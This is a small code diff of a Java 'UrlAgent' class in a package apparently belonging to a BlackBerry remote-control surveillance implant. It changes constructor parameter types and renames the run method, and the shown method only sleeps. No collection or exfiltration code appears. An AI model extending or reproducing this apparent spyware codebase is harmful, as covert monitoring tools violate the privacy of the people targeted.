@@ -6,16 +6,16 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class UrlAgent extends Agent {
     static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);
 
-    public UrlAgent(int agentStatus) {
+    public UrlAgent(boolean agentStatus) {
         super(Agent.AGENT_URL, agentStatus, true);
     }
 
-    protected UrlAgent(int agentStatus, byte[] confParams) {
+    protected UrlAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
 
         this.sleepUntilStopped();
